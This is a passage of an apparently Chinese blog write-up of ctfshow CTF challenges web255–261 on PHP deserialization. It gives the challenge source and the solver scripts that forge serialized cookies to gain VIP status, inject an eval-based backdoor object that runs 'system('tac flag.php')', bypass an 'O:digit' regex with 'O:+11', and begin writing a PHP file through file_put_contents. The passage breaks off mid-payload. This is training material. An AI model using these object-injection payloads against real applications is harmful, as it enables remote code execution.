class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们这里用反序列化，把public $isVip=false;变为public $isVip=true;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>O:11:“ctfShowUser”:1:{s:5:“isVip”;b:1;}</p>
<p>然后通过cookie传进去，由于Cookie 值在 HTTP 协议中有特定的格式要求，并且不能包含某些特殊字符。</p>
<p>所以这里把他们都url全编码一下</p>
<p>%4f%3a%31%31%3a%22%63%74%66%53%68%6f%77%55%73%65%72%22%3a%31%3a%7b%73%3a%35%3a%22%69%73%56%69%70%22%3b%62%3a%31%3b%7d</p>
<p>ctfshow{c6c55995-2da5-480d-8a4c-7f52bc5b74e2}</p>
<h1>web256</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的源码在第三十二行改变了，有一个强比较!==</p>
<p>这里就是要username和password不一样才可以拿到flag，我们知道在之前我们的username和password都是xxxxxx，那么我们通过反序列化能否把username改成xxxxxx1，password改成xxxxxx2呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>O:11:“ctfShowUser”:3:{s:8:“username”;s:7:“xxxxxx1”;s:8:“password”;s:7:“xxxxxx2”;s:5:“isVip”;b:1;}</p>
<p>老样子改成url编码</p>
<p>%4f%3a%31%31%3a%22%63%74%66%53%68%6f%77%55%73%65%72%22%3a%33%3a%7b%73%3a%38%3a%22%75%73%65%72%6e%61%6d%65%22%3b%73%3a%37%3a%22%78%78%78%78%78%78%31%22%3b%73%3a%38%3a%22%70%61%73%73%77%6f%72%64%22%3b%73%3a%37%3a%22%78%78%78%78%78%78%32%22%3b%73%3a%35%3a%22%69%73%56%69%70%22%3b%62%3a%31%3b%7d</p>
<p>ctfshow{73fe0959-ad5d-4b35-96ca-2a93b77b9015}</p>
<h1>web257</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__construct()</code> 是 PHP 类的一个<strong>魔术方法</strong>，也叫<strong>构造函数</strong>。<br>
它会在<strong>类被实例化时</strong>自动调用，通常用于初始化对象的属性或执行一些必要的操作。</p>
<p>例如private $username=‘xxxxxx’;</p>
<p><code>__destruct()</code> 方法是 PHP 中的<strong>析构函数</strong>，它在<strong>对象生命周期结束</strong>时自动调用。</p>
<p>例如脚本执行完之后，private $username=‘xxxxxx’;被销毁，触发__destruct()</p>
<p>分析：</p>
<p>我们需要backDoor里面的eval函数</p>
<p>那么我们可以把$code改为$code=$_POST[a]</p>
<p>先分析主函数，里面有login函数</p>
<p>里面还有一个info函数，对我们没有什么用，可以删除。把__construct()当中的$this-&gt;class=new info();改为$this-&gt;class=new backDoor();</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[zmr]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser)));</span><br></pre></td></tr></table></figure>
<p>cookie：user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A18%3A%22eval%28%24_POST%5Bzmr%5D%29%3B%22%3B%7D%7D</p>
<p>post</p>
<p>zmr=system(‘tac flag.php’);</p>
<p>?username=xxxxxx&amp;password=xxxxxx</p>
<p>ctfshow{16016ad4-f316-4462-979f-30112ed0f119}</p>
<h1>web258</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反</p>
<p>了一个正则表达式：<code>/[oc]:\d+:/i</code>。意思是过滤这两种情况：<code>o:数字:</code>与<code>c:数字:</code><br>
这种情况是用<code>+(加号)</code>绕过的，如：<code>o:+</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac ./flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:11&#x27;</span>,<span class="string">&#x27;:+11&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:8&#x27;</span>,<span class="string">&#x27;:+8&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
<p>?username=xxxxxx&amp;password=xxxxxx</p>
<p>ctfshow{bcf9331c-656d-4fba-81d7-f0127fd2ad28}</p>
<h1>web259</h1>
<p>等待c</p>
<h1>web260</h1>
<p>?ctfshow=ctfshow_i_love_36D</p>
<p>ctfshow{b6341f38-95c0-4dfe-ac89-398b2cea861b}</p>
<h1>web261</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>我们看代码的时候看到invoke 下面有一个eval函数，但这里没有办法使用eval函数</p>
<p>如果类中同时定义了 unserialize() 和 wakeup() 两个魔术方法， 则只有 unserialize() 方法会生效，wakeup() 方法会被忽略。</p>
<p>那么我们就只可以用下面的file_put_contents函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&quot;&lt;?php 